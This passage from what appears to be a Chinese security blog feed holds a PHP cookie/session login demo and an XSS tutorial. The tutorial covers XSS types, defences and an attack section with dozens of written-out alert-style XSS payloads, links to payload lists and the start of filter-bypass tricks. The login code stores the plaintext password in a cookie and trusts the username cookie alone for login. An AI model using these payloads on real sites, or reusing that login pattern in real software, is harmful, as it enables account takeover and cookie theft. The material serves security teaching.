class="line">   echo &quot;改用户名或密码不能为空，3秒后跳转到登录页面&quot;; </span><br><span class="line">   exit; </span><br><span class="line">  &#125; </span><br><span class="line">  else if(($username!&#x3D;&#39;username&#39;)||($password!&#x3D;&#39;password&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   &#x2F;&#x2F;用户名或密码错误 </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;login.html&#39;); </span><br><span class="line">   echo &quot;用户名或密码错误，3秒后跳转到登录页面&quot;; </span><br><span class="line">   exit; </span><br><span class="line">  &#125; </span><br><span class="line">  else if(($username&#x3D;&#x3D;&#39;username&#39;)&amp;&amp;($password&#x3D;&#x3D;&#39;password&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   &#x2F;&#x2F;登录成功将信息保存到session中 </span><br><span class="line">   $_SESSION[&#39;username&#39;]&#x3D;$username; </span><br><span class="line">   $_SESSION[&#39;islogin&#39;]&#x3D;1; </span><br><span class="line">   &#x2F;&#x2F;如果勾选7天内自动保存，则将其保存到cookie </span><br><span class="line">   if($_POST[&#39;remember&#39;]&#x3D;&#x3D;&quot;yes&quot;) </span><br><span class="line">   &#123; </span><br><span class="line">    setcookie(&quot;username&quot;,$username,time()+7*24*60*60); </span><br><span class="line">    setcookie(&quot;code&quot;,$password,time()+7*24*60*60); </span><br><span class="line">   &#125; </span><br><span class="line">   else </span><br><span class="line">   &#123; </span><br><span class="line">    setcookie(&quot;username&quot;,&#39;&#39;,time()-1); </span><br><span class="line">    setcookie(&quot;code&quot;,&#39;&#39;,time()-1); </span><br><span class="line">   &#125; </span><br><span class="line">   &#x2F;&#x2F;跳转到用户首页 </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;index.php&#39;); </span><br><span class="line">  &#125; </span><br><span class="line"> &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"> session_start(); </span><br><span class="line"> <span class="comment">//首先判断Cookie是否有记住用户信息 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;username&#x27;</span>])) </span><br><span class="line"> &#123; </span><br><span class="line">  $_SESSION[<span class="string">&#x27;username&#x27;</span>]=$_COOKIE[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">  $_SESSION[<span class="string">&#x27;islogin&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;islogin&#x27;</span>])) </span><br><span class="line"> &#123; </span><br><span class="line">  <span class="comment">//已经登录 </span></span><br><span class="line">  <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;:你好，欢迎进入个人中心！&lt;br/&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line"> &#123; <span class="comment">//为登录 </span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;你还未登录，请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>Logout.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"> session_start(); </span><br><span class="line"> <span class="comment">//清除session </span></span><br><span class="line"> $username=$_SESSION[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"> $_SESSION=<span class="keyword">array</span>(); </span><br><span class="line"> session_destroy(); </span><br><span class="line"> <span class="comment">//清除cookie </span></span><br><span class="line"> setcookie(<span class="string">&quot;username&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line"> setcookie(<span class="string">&quot;code&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span>,欢迎下次光临&quot;</span>; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;重新&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h5 id="session与cookie的区别"><a href="#session与cookie的区别" class="headerlink" title="session与cookie的区别"></a>session与cookie的区别</h5><p>Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器</p><p>网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies 。</p><p>cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力。</p><p>服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。</p><p>cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的</p><p>session机制是一种服务器端的机制，session由服务端生成，每一个session对应一个session id，session id将被在本次响应中返回给客户端保存，可以保存在cookie中。</p><p>1、存储方式不同</p><p>Cookie中只能保管ASCII字符串</p><p>Session中能够存取任何类型的数据</p><p>2、隐私策略的不同</p><p>Cookie存储在客户端阅读器中，对客户端是可见的，客户端的一些程序可能会窥探、复制以至修正Cookie中的内容。</p><p>Session存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险</p><p>3、跨域支持上的不同</p><p>Cookie支持跨域名访问</p><p>Session仅在他所在的域名内有效</p><p>4、cookie数据存放在客户的浏览器（客户端）上，session数据放在服务器上，但是服务端的session的实现对客户端的cookie有依赖关系的；</p><p>5、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session；</p><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE；</p><p>6、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K；</p><h5 id="cookie如何生成？"><a href="#cookie如何生成？" class="headerlink" title="cookie如何生成？"></a>cookie如何生成？</h5><p>1、由服务端生成，在返回包中的set-cookie选项设置cookie。</p><p>2、前端浏览器通过js设置cookie。</p><h5 id="什么是session？"><a href="#什么是session？" class="headerlink" title="什么是session？"></a>什么是session？</h5><p>Session是一种协议，是保持用户状态的协议</p><p>客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;session、cookie原理&quot;&gt;&lt;a href=&quot;#session、cookie原理&quot; class=&quot;headerlink&quot; title=&quot;session、cookie原理&quot;&gt;&lt;/a&gt;session、cookie原理&lt;/h3&gt;&lt;h5 id=&quot;登陆前&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Cookie与Session" scheme="http://s1eady.top/tags/Cookie%E4%B8%8ESession/"/>
    
  </entry>
  
  <entry>
    <title>xss漏洞</title>
    <link href="http://s1eady.top/2019/06/22/xss/"/>
    <id>http://s1eady.top/2019/06/22/xss/</id>
    <published>2019-06-22T01:20:56.000Z</published>
    <updated>2020-10-07T03:24:46.446Z</updated>
    
    <content type="html"><![CDATA[<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。</li><li>监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。</li><li>更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码</p><h6 id="常见漏洞位置"><a href="#常见漏洞位置" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>网站搜索框、用户登录入口、注入表单的地方。</p><h5 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。</p><h6 id="常见漏洞位置-1"><a href="#常见漏洞位置-1" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>论坛、博客等留言位置、评论位置。</p><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>原理</p><p>DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><p>当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><p>攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5;</span><br><span class="line">document.write(decodeURI(document.URL.substring(pos,document.URL.length)));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>获取输入函数</p><ul><li>document.URL</li><li>document.URLUnencoded</li><li>document.location（及其许多属性）</li><li>document.referrer</li><li>window.location（及其许多属性）</li><li>location</li><li>location.href</li><li>location.search</li><li>location.hash</li><li>location.pathname</li></ul><p>输出函数</p><ul><li><p>eval(…)</p></li><li><p>window.execScript(…)</p></li><li><p>window.setInterval(…)</p></li><li><p>window.setTimeout(…)</p></li><li><p>document.write(…)</p></li><li><p>document.writeln(…)</p></li><li><p>element.innerHTML(…)</p></li><li><p>document.forms[0].action=… (and various other collections)</p></li><li><p>document.attachEvent(…)</p></li><li><p>document.create…(…)</p></li><li><p>document.execCommand(…)</p></li><li><p>document.body. … (accessing the DOM through the body object)</p></li><li><p>window.attachEvent(…)</p></li><li><p>document.location=… (and assigning to location’s href, host and hostname)</p></li><li><p>document.location.hostname=…</p></li><li><p>document.location.replace(…)</p></li><li><p>document.location.assign(…)</p></li><li><p>document.URL=…</p></li><li><p>window.navigate(…)</p></li><li><p>document.open(…)</p></li><li><p>window.open(…)</p></li><li><p>window.location.href=… (and assigning to location’s href, host and hostname)</p></li></ul><p>总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h4 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框</p><p>2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等</p><p>xss大多出现在输入框中</p><p>3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方</p><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="存储xss和反射xss"><a href="#存储xss和反射xss" class="headerlink" title="存储xss和反射xss"></a>存储xss和反射xss</h5><p>1、纯前端渲染，把代码和数据分隔开。</p><ul><li><p>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</p></li><li><p>然后浏览器执行 HTML 中的 JavaScript。</p></li><li><p>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。</p></li></ul><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（<code>.innerText</code>），还是属性（<code>.setAttribute</code>），还是样式（<code>.style</code>）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。</p><p>2、直接使用html实体转义函数,比如php函数<code>htmlspecialchars（）</code>和<code>htmlentities()</code>、<code>escapeHTML</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符转义后的字符</span><br><span class="line">&amp;   &amp;</span><br><span class="line">&lt;   &lt;</span><br><span class="line">&gt;   &gt;</span><br><span class="line">&quot;   &quot;</span><br><span class="line">&#39;   &amp;#x27;</span><br><span class="line">&#x2F;   &#x2F;</span><br></pre></td></tr></table></figure><p>不能仅仅靠实体转义函数来防御xss，像<code>javascript:alert(&amp;#x27;XSS&amp;#x27;)</code>这种类型的攻击，实体转义函数就不会对其起作用。</p><p>而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。</p><p>但是我们可以使用<code>escapeEmbedJSON()</code> 函数，对内联 JSON 进行转义。</p><table><thead><tr><th>字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td><code>U+2028</code></td><td><code>\u2028</code></td></tr><tr><td><code>U+2029</code></td><td><code>\u2029</code></td></tr><tr><td><code>&lt;</code></td><td><code>\u003c</code></td></tr></tbody></table><p>应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。</p><table><thead><tr><th>XSS 安全漏洞</th><th>简单转义是否有防护作用</th></tr></thead><tbody><tr><td>HTML 标签文字内容</td><td>有</td></tr><tr><td>HTML 属性值</td><td>有</td></tr><tr><td>CSS 内联样式</td><td>无</td></tr><tr><td>内联 JavaScript</td><td>无</td></tr><tr><td>内联 JSON</td><td>无</td></tr><tr><td>跳转链接</td><td>无</td></tr></tbody></table><h5 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h5><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。</p><h5 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h5><p>1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。</p><p>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</p><p>禁止向第三方域提交数据，这样用户数据也不会外泄；</p><p>2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p><p>3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。<br>4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。</p><p>5、数据插入数据、取出数据库都不转义,在视图文件中进行转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment-content&quot;</span>&gt;&lt;?php echo htmlspecialchars($comment[<span class="string">&#x27;content&#x27;</span>];) ?&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。</p><p>2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p><p>3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>1、如果前端限制,尝试burp抓包改包</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># XSS-Payload</span></span><br><span class="line">https:<span class="comment">//github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayload</span></span><br><span class="line">https:<span class="comment">//github.com/ZephrFish/XSSPayloads/blob/master/raw_payloads</span></span><br><span class="line">https:<span class="comment">//github.com/silience/xsspayload</span></span><br><span class="line">https:<span class="comment">//github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txt</span></span><br><span class="line">https:<span class="comment">//github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt</span></span><br></pre></td></tr></table></figure><p>2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试</p><p>3、手工测试常见标签</p><p><code>&lt;img&gt;</code>标签</p><p>利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><p>标准格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>利用方式3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>利用方式4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p><code>input</code>标签</p><p>标准格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;标签</code></p><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p><code>svg&lt;&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。</p><h5 id="1、过滤关键字"><a href="#1、过滤关键字" class="headerlink" title="1、过滤关键字"></a>1、过滤关键字</h5><ul><li><p>大小写绕过、大小写混合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 